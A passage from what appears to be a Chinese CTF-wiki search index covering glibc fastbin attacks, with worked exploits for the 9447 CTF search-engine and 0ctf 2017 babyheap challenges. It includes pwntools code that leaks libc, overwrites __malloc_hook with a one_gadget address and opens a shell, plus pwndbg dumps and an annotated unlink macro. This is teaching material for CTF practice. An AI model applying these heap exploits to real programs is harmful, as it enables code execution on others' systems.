b->a->b->a->\u2026\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5728\u7533\u8bf7\u7b2c\u4e00\u4e2a\u76f8\u540c\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u8bbe\u7f6e b \u7684 fd \u4e3a malloc_hook \u9644\u8fd1\u5904\u7684 chunk 0x7fd798586aed \uff08\u8fd9\u91cc\u662f\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4ee3\u7801\u4e2d\u9700\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff09\u3002 pwndbg> print ( void* ) & main_arena $1 = ( void * ) 0x7fd798586b20 <main_arena> pwndbg> x/8gx 0x7fd798586b20-16 0x7fd798586b10 <__malloc_hook>: 0x0000000000000000 0x0000000000000000 0x7fd798586b20 <main_arena>: 0x0000000000000000 0x0000000000bce130 0x7fd798586b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7fd798586b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 pwndbg> find_fake_fast 0x7fd798586b10 0x7f FAKE CHUNKS 0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA { prev_size = 15535264025435701248 , size = 127 , fd = 0xd798247e20000000, bk = 0xd798247a0000007f, fd_nextsize = 0x7f, bk_nextsize = 0x0 } pwndbg> print /x 0x7fd798586b10-0x7fd798586aed $2 = 0x23 pwndbg> print /x 0x7fd798586b20-0x7fd798586aed $3 = 0x33 \u90a3\u4e48\u5f53\u518d\u6b21\u5206\u914d b \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u6b64\u65f6 b \u7684 fd \u5df2\u7ecf\u88ab\u6211\u4eec\u4fee\u6539\u4e3a\u4e86malloc_hook\u9644\u8fd1\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8fd9\u65f6\u5019\u6211\u4eec\u518d\u6b21\u5206\u914d\u4e00\u4e2a chunk\uff0c\u5c31\u4f1a\u6307\u5411 0x7fd798586aed \u3002 \u6b64\u540e\u4fbf\u53ea\u9700\u8981\u5c06 malloc_hook \u4fee\u6539\u4e3a one_gadget \u5730\u5740\u5c31\u53ef\u4ee5\u62ff\u5230 shell \u4e86\u3002 # 3. fastbin attack to malloc_hook nearby chunk fake_chunk_addr = main_arena_addr - 0x33 fake_chunk = p64 ( fake_chunk_addr ) . ljust ( 0x60 , 'f' ) index_sentence ( fake_chunk ) index_sentence ( 'a' * 0x60 ) index_sentence ( 'b' * 0x60 ) one_gadget_addr = libc_base + 0xf02a4 payload = 'a' * 0x13 + p64 ( one_gadget_addr ) payload = payload . ljust ( 0x60 , 'f' ) #gdb.attach(p) index_sentence ( payload ) p . interactive () \u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u591a\u9009\u62e9\u51e0\u4e2a one_gadget \u5730\u5740\uff0c\u56e0\u4e3a one_gadget \u6210\u529f\u662f\u6709\u6761\u4ef6\u7684\u3002","title":"\u5206\u914d malloc_hook \u9644\u8fd1chunk"},{"location":"pwn/heap/fastbin_attack/#shell","text":"\u279c 2015_9447ctf_search-engine git: ( master ) python exp.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) FORTIFY: Enabled [ + ] Starting local process './search' : pid 31158 [ * ] PID: 31158 [ + ] unsortedbin addr: 0x7f802e73bb78 [ + ] libc base addr: 0x7f802e377000 [ * ] Switching to interactive mode Enter the sentence: $ ls exp.py search search.id1 search.nam libc.so.6 search.id0 search.id2 search.til \u5f53\u7136\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u79cd \u65b9\u6cd5 \uff0c\u5c06 chunk \u5206\u914d\u5230\u6808\u4e0a\u3002","title":"shell"},{"location":"pwn/heap/fastbin_attack/#2017-0ctf-babyheap","text":"","title":"2017 0ctf babyheap"},{"location":"pwn/heap/fastbin_attack/#_25","text":"\u279c 2017_0ctf_babyheap git: ( master ) file babyheap babyheap: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped \u279c 2017_0ctf_babyheap git: ( master ) checksec babyheap [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/fastbin_attack/#_26","text":"\u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u5206\u914d\u5668\uff0c\u4e3b\u8981\u7531\u4ee5\u4e0b\u56db\u79cd\u529f\u80fd puts ( \"1. Allocate\" ); puts ( \"2. Fill\" ); puts ( \"3. Free\" ); puts ( \"4. Dump\" ); puts ( \"5. Exit\" ); return printf ( \"Command: \" ); \u5176\u4e2d\uff0c\u6bcf\u6b21\u8bfb\u53d6\u547d\u4ee4\u7684\u51fd\u6570\u7531\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u7684\u51fd\u6570\u800c\u51b3\u5b9a\u3002 \u901a\u8fc7\u5206\u914d\u51fd\u6570 void __fastcall allocate ( __int64 a1 ) { signed int i ; // [rsp+10h] [rbp-10h] signed int v2 ; // [rsp+14h] [rbp-Ch] void * v3 ; // [rsp+18h] [rbp-8h] for ( i = 0 ; i <= 15 ; ++ i ) { if ( !* ( _DWORD * )( 24LL * i + a1 ) ) { printf ( \"Size: \" ); v2 = read_num (); if ( v2 > 0 ) { if ( v2 > 4096 ) v2 = 4096 ; v3 = calloc ( v2 , 1uLL ); if ( ! v3 ) exit ( - 1 ); * ( _DWORD * )( 24LL * i + a1 ) = 1 ; * ( _QWORD * )( a1 + 24LL * i + 8 ) = v2 ; * ( _QWORD * )( a1 + 24LL * i + 16 ) = v3 ; printf ( \"Allocate Index %d \\n \" , ( unsigned int ) i ); } return ; } } } \u7533\u8bf7\u7684 chunk \u7684\u6700\u5927\u4e3a 4096\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6bcf\u4e2a chunk \u4e3b\u8981\u6709\u4e09\u4e2a\u5b57\u6bb5\uff1a\u662f\u5426\u5728\u4f7f\u7528\uff0c\u5806\u5757\u5927\u5c0f\uff0c\u5806\u5757\u4f4d\u7f6e\u3002\u6545\u800c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u3002 00000000 chunk struc ; (sizeof=0x18, mappedto_6) 00000000 inuse dq ? 00000008 size dq ? 00000010 ptr dq ? 00000018 chunk ends \u9700\u8981\u6ce8\u610f\u7684\u662f\u5806\u5757\u662f\u7531 calloc \u5206\u914d\u7684\uff0c\u6240\u4ee5 chunk \u4e2d\u7684\u5185\u5bb9\u5168\u90fd\u4e3a \\x00 \u3002 \u5728\u586b\u5145\u5185\u5bb9\u7684\u529f\u80fd\u4e2d\uff0c\u4f7f\u7528\u8bfb\u53d6\u5185\u5bb9\u7684\u51fd\u6570\u662f\u76f4\u63a5\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u5b57\u7b26\u4e32\u7ed3\u5c3e\u3002 \u800c\u4e14\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u8fd9\u4e2a\u6307\u5b9a\u957f\u5ea6\u662f\u6211\u4eec\u6307\u5b9a\u7684\uff0c\u5e76\u4e0d\u662f\u4e4b\u524d chunk \u5206\u914d\u65f6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u8fd9\u91cc\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u5806\u6ea2\u51fa\u7684\u60c5\u5f62\u3002 __int64 __fastcall fill ( chunk * a1 ) { __int64 result ; // rax int v2 ; // [rsp+18h] [rbp-8h] int v3 ; // [rsp+1Ch] [rbp-4h] printf ( \"Index: \" ); result = read_num (); v2 = result ; if ( ( signed int ) result >= 0 && ( signed int ) result <= 15 ) { result = LODWORD ( a1 [( signed int ) result ]. inuse ); if ( ( _DWORD ) result == 1 ) { printf ( \"Size: \" ); result = read_num (); v3 = result ; if ( ( signed int ) result > 0 ) { printf ( \"Content: \" ); result = read_content (( char * ) a1 [ v2 ]. ptr , v3 ); } } } return result ; } \u5728\u91ca\u653echunk\u7684\u529f\u80fd\u4e2d\u8be5\u8bbe\u7f6e\u7684\u90fd\u8bbe\u7f6e\u4e86\u3002 __int64 __fastcall free_chunk ( chunk * a1 ) { __int64 result ; // rax int v2 ; // [rsp+1Ch] [rbp-4h] printf ( \"Index: \" ); result = read_num (); v2 = result ; if ( ( signed int ) result >= 0 && ( signed int ) result <= 15 ) { result = LODWORD ( a1 [( signed int ) result ]. inuse ); if ( ( _DWORD ) result == 1 ) { LODWORD ( a1 [ v2 ]. inuse ) = 0 ; a1 [ v2 ]. size = 0LL ; free ( a1 [ v2 ]. ptr ); result = ( __int64 ) & a1 [ v2 ]; * ( _QWORD * )( result + 16 ) = 0LL ; } } return result ; } dump \u5c31\u662f\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15 chunk \u7684\u5185\u5bb9\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/fastbin_attack/#_27","text":"\u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u6211\u4eec\u4e3b\u8981\u6709\u7684\u6f0f\u6d1e\u5c31\u662f\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u7531\u4e8e\u8be5\u7a0b\u5e8f\u51e0\u4e4e\u6240\u6709\u4fdd\u62a4\u90fd\u5f00\u542f\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u8981\u6709\u4e00\u4e9b\u6cc4\u6f0f\u624d\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u7684\u6d41\u7a0b\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740\u3002 \u5229\u7528 fastbin attack \u5c06chunk \u5206\u914d\u5230 malloc_hook \u9644\u8fd1\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"pwn/heap/fastbin_attack/#libc_1","text":"\u7531\u4e8e\u6211\u4eec\u662f\u5e0c\u671b\u4f7f\u7528 unsorted bin \u6765\u6cc4\u6f0f libc \u57fa\u5730\u5740\uff0c\u6240\u4ee5\u5fc5\u987b\u8981\u6709 chunk \u53ef\u4ee5\u88ab\u94fe\u63a5\u5230 unsorted bin \u4e2d\uff0c\u6240\u4ee5\u8be5 chunk \u4e0d\u80fd\u4f7f fastbin chunk\uff0c\u4e5f\u4e0d\u80fd\u548c top chunk \u76f8\u90bb\u3002\u56e0\u4e3a\u524d\u8005\u4f1a\u88ab\u6dfb\u52a0\u5230 fastbin \u4e2d\uff0c\u540e\u8005\u5728\u4e0d\u662ffastbin \u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u8fd9\u91cc\u6784\u9020\u4e00\u4e2a small bin chunk\u3002\u5728\u5c06\u8be5 chunk \u91ca\u653e\u5230 unsorted bin \u7684\u540c\u65f6\uff0c\u4e5f\u9700\u8981\u8ba9\u53e6\u5916\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u7684 chunk \u53ef\u4ee5\u540c\u65f6\u6307\u5411\u8be5 chunk \u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u624d\u53ef\u4ee5\u8fdb\u884c\u6cc4\u6f0f\u3002\u5177\u4f53\u8bbe\u8ba1\u5982\u4e0b # 1. leak libc base allocate ( 0x10 ) # idx 0, 0x00 allocate ( 0x10 ) # idx 1, 0x20 allocate ( 0x10 ) # idx 2, 0x40 allocate ( 0x10 ) # idx 3, 0x60 allocate ( 0x80 ) # idx 4, 0x80 # free idx 1, 2, fastbin[0]->idx1->idx2->NULL free ( 2 ) free ( 1 ) \u9996\u5148\uff0c\u6211\u4eec\u7533\u8bf7\u4e86 5 \u4e2achunk\uff0c\u5e76\u91ca\u653e\u4e86\u4e24\u4e2achunk\uff0c\u6b64\u65f6\u5806\u7684\u60c5\u51b5\u5982\u4e0b\u3002 pwndbg> x/20gx 0x55a03ca22000 0x55a03ca22000: 0x0000000000000000 0x0000000000000021 idx 0 0x55a03ca22010: 0x0000000000000000 0x0000000000000000 0x55a03ca22020: 0x0000000000000000 0x0000000000000021 idx 1 0x55a03ca22030: 0x000055a03ca22040 0x0000000000000000 0x55a03ca22040: 0x0000000000000000 0x0000000000000021 idx 2 0x55a03ca22050: 0x0000000000000000 0x0000000000000000 0x55a03ca22060: 0x0000000000000000 0x0000000000000021 idx 3 0x55a03ca22070: 0x0000000000000000 0x0000000000000000 0x55a03ca22080: 0x0000000000000000 0x0000000000000091 idx 4 0x55a03ca22090: 0x0000000000000000 0x0000000000000000 pwndbg> fastbins fastbins 0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22040 \u25c2\u2014 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 \u5f53\u6211\u4eec\u7f16\u8f91 idx0 \u540e\uff0c\u786e\u5b9e\u5df2\u7ecf\u5c06\u5176\u6307\u5411idx4\u4e86\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u53ef\u4ee5\u6210\u529f\u662f\u56e0\u4e3a\u5806\u7684\u59cb\u7ec8\u662f 4KB \u5bf9\u9f50\u7684\uff0c\u6240\u4ee5idx 4\u7684\u8d77\u59cb\u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5fc5\u7136\u662f0x80\u3002 # edit idx 0 chunk to particial overwrite idx1's fd to point to idx4 payload = 0x10 * 'a' + p64 ( 0 ) + p64 ( 0x21 ) + p8 ( 0x80 ) fill ( 0 , len ( payload ), payload ) \u4fee\u6539\u6210\u529f\u540e\u5982\u4e0b pwndbg> x/20gx 0x55a03ca22000 0x55a03ca22000: 0x0000000000000000 0x0000000000000021 0x55a03ca22010: 0x6161616161616161 0x6161616161616161 0x55a03ca22020: 0x0000000000000000 0x0000000000000021 0x55a03ca22030: 0x000055a03ca22080 0x0000000000000000 0x55a03ca22040: 0x0000000000000000 0x0000000000000021 0x55a03ca22050: 0x0000000000000000 0x0000000000000000 0x55a03ca22060: 0x0000000000000000 0x0000000000000021 0x55a03ca22070: 0x0000000000000000 0x0000000000000000 0x55a03ca22080: 0x0000000000000000 0x0000000000000091 0x55a03ca22090: 0x0000000000000000 0x0000000000000000 pwndbg> fastbins fastbins 0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22080 \u25c2\u2014 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 \u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u4e24\u4e2a\u65f6\uff0c\u7b2c\u4e8c\u4e2a\u7533\u8bf7\u5230\u7684\u5c31\u662fidx 4\u5904\u7684chunk\u3002\u4e3a\u4e86\u80fd\u591f\u7533\u8bf7\u6210\u529f\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd idx4 \u7684size \u4e0e\u5f53\u524d fastbin \u7684\u5927\u5c0f\u4e00\u81f4\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u5f97\u4fee\u6539\u5b83\u7684\u5927\u5c0f\u3002\u7533\u8bf7\u6210\u529f\u540e\uff0cidx2\u4f1a\u6307\u5411idx4\u3002 # if we want to allocate at idx4, we must set it's size as 0x21 payload = 0x10 * 'a' + p64 ( 0 ) + p64 ( 0x21 ) fill ( 3 , len ( payload ), payload ) allocate ( 0x10 ) # idx 1 allocate ( 0x10 ) # idx 2, which point to idx4's location \u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u5c06 idx 4 \u653e\u5230 unsorted bin \u4e2d\u7684\u8bdd\uff0c\u4e3a\u4e86\u9632\u6b62\u5176\u4e0etop chunk \u5408\u5e76\uff0c\u6211\u4eec\u9700\u8981\u518d\u6b21\u7533\u8bf7\u4e00\u4e2achunk\u3002\u6b64\u540e\u518d\u91ca\u653e idx4 \u5c31\u4f1a\u8fdb\u5165 unsorted bin\u4e2d\u53bb\u4e86\u3002\u6b64\u65f6\u7531\u4e8e idx2 \u4e5f\u6307\u5411\u8fd9\u4e2a\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u5c55\u793a\u4ed6\u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\u5f97\u5230unsorted bin\u7684\u5730\u5740\u4e86\u3002 # if want to free idx4 to unsorted bin, we must fix its size payload = 0x10 * 'a' + p64 ( 0 ) + p64 ( 0x91 ) fill ( 3 , len ( payload ), payload ) # allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk allocate ( 0x80 ) # idx 5 free ( 4 ) # as idx 2 point to idx4, just show this dump ( 2 ) p . recvuntil ( 'Content: \\n ' ) unsortedbin_addr = u64 ( p . recv ( 8 )) main_arena = unsortedbin_addr - offset_unsortedbin_main_arena log . success ( 'main arena addr: ' + hex ( main_arena )) main_arena_offset = 0x3c4b20 libc_base = main_arena - main_arena_offset log . success ( 'libc base addr: ' + hex ( libc_base ))","title":"\u6cc4\u6f0f libc \u57fa\u5730\u5740"},{"location":"pwn/heap/fastbin_attack/#chunkmalloc_hook","text":"\u7531\u4e8e malloc hook \u9644\u8fd1\u7684 chunk \u5927\u5c0f\u4e3a 0x7f\uff0c\u6240\u4ee5\u6570\u636e\u533a\u57df\u4e3a0x60\u3002\u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u7684\u65f6\u5019\uff0c\u5bf9\u5e94 fastbin \u94fe\u8868\u4e2d\u6ca1\u6709\u76f8\u5e94\u5927\u5c0fchunk\uff0c\u6240\u4ee5\u6839\u636e\u5806\u5206\u914d\u5668\u89c4\u5219\uff0c\u5b83\u4f1a\u4f9d\u6b21\u5904\u7406unsorted bin\u4e2d\u7684chunk\uff0c\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684bin\u4e2d\uff0c\u4e4b\u540e\u4f1a\u518d\u6b21\u5c1d\u8bd5\u5206\u914d chunk\uff0c\u56e0\u4e3a\u4e4b\u524d\u91ca\u653e\u7684 chunk \u6bd4\u5f53\u524d\u7533\u8bf7\u7684 chunk \u5927\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u5176\u524d\u9762\u5206\u5272\u51fa\u6765\u4e00\u5757\u3002\u6240\u4ee5 idx2 \u4ecd\u7136\u6307\u5411\u8be5\u4f4d\u7f6e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u7684\u529e\u6cd5\u5148\u91ca\u653e\u7533\u8bf7\u5230\u7684chunk\uff0c\u7136\u540e\u518d\u6b21\u4fee\u6539 fd \u6307\u9488\u4e3a fake chunk \u5373\u53ef\u3002\u6b64\u540e\u6211\u4eec\u4fee\u6539 malloc_hook \u5904\u7684\u6307\u9488\u5373\u53ef\u5f97\u5230\u89e6\u53d1 onegadget\u3002 # 2. malloc to malloc_hook nearby # allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4 allocate ( 0x60 ) free ( 4 ) # edit idx4's fd point to fake chunk fake_chunk_addr = main_arena - 0x33 fake_chunk = p64 ( fake_chunk_addr ) fill ( 2 , len ( fake_chunk ), fake_chunk ) allocate ( 0x60 ) # idx 4 allocate ( 0x60 ) # idx 6 one_gadget_addr = libc_base + 0x4526a payload = 0x13 * 'a' + p64 ( one_gadget_addr ) fill ( 6 , len ( payload ), payload ) # trigger malloc_hook allocate ( 0x100 ) p . interactive () \u540c\u65f6\uff0c\u8fd9\u91cc\u7684 onegadget \u5730\u5740\u4e5f\u53ef\u80fd\u9700\u8981\u5c1d\u8bd5\u591a\u6b21\u3002","title":"\u5206\u914dchunk\u5230malloc_hook\u9644\u8fd1"},{"location":"pwn/heap/fastbin_attack/#_28","text":"L-CTF2016\u2013pwn200","title":"\u9898\u76ee"},{"location":"pwn/heap/fastbin_attack/#_29","text":"https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/ http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717","title":"\u53c2\u8003\u6587\u732e"},{"location":"pwn/heap/heap_implementation_details/","text":"\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0 \u00b6 \u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u4efb\u4f55\u5806\u7684\u5b9e\u73b0\u90fd\u9700\u8981\u4ece\u4ee5\u4e0b\u4e24\u4e2a\u89d2\u5ea6\u8003\u8651\u76f8\u5e94\u7684\u95ee\u9898 \u5b8f\u89c2\u89d2\u5ea6 \u521b\u5efa\u5806 \u5806\u521d\u59cb\u5316 \u5220\u9664\u5806 \u5fae\u89c2\u89d2\u5ea6 \u7533\u8bf7\u5185\u5b58\u5757 \u91ca\u653e\u5185\u5b58\u5757 \u5f53\u7136\uff0c\u8fd9\u4e9b\u90fd\u662f\u6bd4\u8f83\u9ad8\u5c42\u9762\u7684\u60f3\u6cd5\uff0c\u4e0d\u540c\u7684\u5806\u7684\u5e95\u5c42\u5b9e\u73b0\u4f1a\u6709\u6240\u4e0d\u540c\u3002 \u5806\u5b9e\u73b0\u6982\u89c8 \u00b6 \u5806\u521d\u59cb\u5316 \u00b6 \u5806\u521d\u59cb\u5316\u662f\u5728\u7528\u6237\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\u6267\u884c malloc_consolidate \u518d\u6267\u884c malloc_init_state \u5b9e\u73b0\u7684\u3002\u8fd9\u91cc\u4e0d\u505a\u8fc7\u591a\u8bb2\u89e3\u3002\u53ef\u4ee5\u53c2\u89c1 malloc_state \u76f8\u5173\u51fd\u6570 \u3002 \u521b\u5efa\u5806 \u00b6 \u53cc\u5411\u94fe\u8868\u76f8\u5173\u64cd\u4f5c \u00b6 unlink \u00b6 unlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff08\u53ea\u5b58\u50a8\u7a7a\u95f2\u7684 chunk\uff09\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528 malloc \u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002 \u4f9d\u6b21\u904d\u5386\u5904\u7406 unsorted bin \u65f6\u4e5f\u6ca1\u6709\u4f7f\u7528 unlink \u7684\u3002 \u4ece\u6bd4\u8bf7\u6c42\u7684 chunk \u6240\u5728\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002 Free \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 malloc_consolidate \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 realloc \u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86top chunk\uff09\u3002 \u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b /* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { \\ // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ FD = P -> fd ; \\ BK = P -> bk ; \\ // \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002 if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ else { \\ FD -> bk = BK ; \\ BK -> fd = FD ; \\ // \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539 if ( ! in_smallbin_range ( chunksize_nomask ( P )) \\ // \u5982\u679cP->fd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 nextsize \u94fe\u8868\u4e2d\u3002 // \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002 // \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002 && __builtin_expect ( P -> fd_nextsize != NULL , 0 )) { \\ // \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \\ // \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002 // \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d if ( FD -> fd_nextsize == NULL ) { \\ // \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P // \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684 if ( P -> fd_nextsize == P ) \\ FD -> fd_nextsize = FD -> bk_nextsize = FD ; \\ else { \\ // \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d FD -> fd_nextsize = P -> fd_nextsize ; \\ FD -> bk_nextsize = P -> bk_nextsize ; \\ P -> fd_nextsize -> bk_nextsize = FD ; \\ P -> bk_nextsize -> fd_nextsize = FD ; \\ } \\ } else { \\ // \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef P -> fd_nextsize -> bk_nextsize = P -> bk_nextsize ; \\ P -> bk_nextsize -> fd_nextsize = P -> fd_nextsize ; \\ } \\ } \\ } \\ } \u8fd9\u91cc\u6211\u4eec\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2anextsize \u7684\u5904\u7406\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c P \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316 